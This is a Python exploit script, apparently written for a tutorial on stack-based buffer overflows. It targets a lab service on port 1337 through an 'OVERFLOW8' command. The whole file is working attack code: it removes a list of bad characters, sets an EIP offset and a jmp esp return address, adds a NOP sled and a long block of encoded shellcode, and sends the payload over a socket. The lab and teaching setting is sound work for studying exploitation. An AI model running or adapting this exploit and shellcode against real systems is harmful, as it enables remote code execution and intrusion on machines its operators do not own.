#!/usr/bin/env python3

'''

Exploit written for Guide to Stack-Based Buffer Overflows
----------------------------------------------------------
https://medium.com/@xJay/
https://twitter.com/gpiojoe

'''

from pwn import *
import socket


host, port = '10.10.171.196', 1337


# Byte Array iterating from \x01 - \xff
chars = bytearray(range(1,255))

# Remove bad bytes from the above byte array
bad_chars = [b'\x00', b'\x1d', b'\x2e', b'\xc7', b'\xee']
for char in  bad_chars:
    chars = chars.replace(char, b"")


shellcode =  b""
shellcode += b"\xdb\xc8\xd9\x74\x24\xf4\xbd\x44\x8a\x37\xa2"
shellcode += b"\x5e\x33\xc9\xb1\x52\x31\x6e\x17\x83\xc6\x04"
shellcode += b"\x03\x2a\x99\xd5\x57\x4e\x75\x9b\x98\xae\x86"
shellcode += b"\xfc\x11\x4b\xb7\x3c\x45\x18\xe8\x8c\x0d\x4c"
shellcode += b"\x05\x66\x43\x64\x9e\x0a\x4c\x8b\x17\xa0\xaa"
shellcode += b"\xa2\xa8\x99\x8f\xa5\x2a\xe0\xc3\x05\x12\x2b"
shellcode += b"\x16\x44\x53\x56\xdb\x14\x0c\x1c\x4e\x88\x39"
shellcode += b"\x68\x53\x23\x71\x7c\xd3\xd0\xc2\x7f\xf2\x47"
shellcode += b"\x58\x26\xd4\x66\x8d\x52\x5d\x70\xd2\x5f\x17"
shellcode += b"\x0b\x20\x2b\xa6\xdd\x78\xd4\x05\x20\xb5\x27"
shellcode += b"\x57\x65\x72\xd8\x22\x9f\x80\x65\x35\x64\xfa"
shellcode += b"\xb1\xb0\x7e\x5c\x31\x62\x5a\x5c\x96\xf5\x29"
shellcode += b"\x52\x53\x71\x75\x77\x62\x56\x0e\x83\xef\x59"
shellcode += b"\xc0\x05\xab\x7d\xc4\x4e\x6f\x1f\x5d\x2b\xde"
shellcode += b"\x20\xbd\x94\xbf\x84\xb6\x39\xab\xb4\x95\x55"
shellcode += b"\x18\xf5\x25\xa6\x36\x8e\x56\x94\x99\x24\xf0"
shellcode += b"\x94\x52\xe3\x07\xda\x48\x53\x97\x25\x73\xa4"
shellcode += b"\xbe\xe1\x27\xf4\xa8\xc0\x47\x9f\x28\xec\x9d"
shellcode += b"\x30\x78\x42\x4e\xf1\x28\x22\x3e\x99\x22\xad"
shellcode += b"\x61\xb9\x4d\x67\x0a\x50\xb4\xe0\x3f\xa3\xa6"
shellcode += b"\xa4\x57\xa9\xc6\x55\xf4\x24\x20\x3f\x14\x61"
shellcode += b"\xfb\xa8\x8d\x28\x77\x48\x51\xe7\xf2\x4a\xd9"
shellcode += b"\x04\x03\x04\x2a\x60\x17\xf1\xda\x3f\x45\x54"
shellcode += b"\xe4\x95\xe1\x3a\x77\x72\xf1\x35\x64\x2d\xa6"
shellcode += b"\x12\x5a\x24\x22\x8f\xc5\x9e\x50\x52\x93\xd9"
shellcode += b"\xd0\x89\x60\xe7\xd9\x5c\xdc\xc3\xc9\x98\xdd"
shellcode += b"\x4f\xbd\x74\x88\x19\x6b\x33\x62\xe8\xc5\xed"
shellcode += b"\xd9\xa2\x81\x68\x12\x75\xd7\x74\x7f\x03\x37"
shellcode += b"\xc4\xd6\x52\x48\xe9\xbe\x52\x31\x17\x5f\x9c"
shellcode += b"\xe8\x93\x6f\xd7\xb0\xb2\xe7\xbe\x21\x87\x65"
shellcode += b"\x41\x9c\xc4\x93\xc2\x14\xb5\x67\xda\x5d\xb0"
shellcode += b"\x2c\x5c\x8e\xc8\x3d\x09\xb0\x7f\x3d\x18"


command = b"OVERFLOW8 "

# Find the offset of EIP
offset = b"A" * cyclic_find(0x61777261, endian='little')

# Convert address of the [jmp esp] instruction into the desired endianess
jmp_esp = p32(0x625011AF)
nop_sled = b"\x90"*24

payload = b''.join([
    command,
    offset,
    jmp_esp,
    nop_sled,
    shellcode,

    ])


with socket.socket() as s:
    s.connect((host, port))
    s.send(payload)



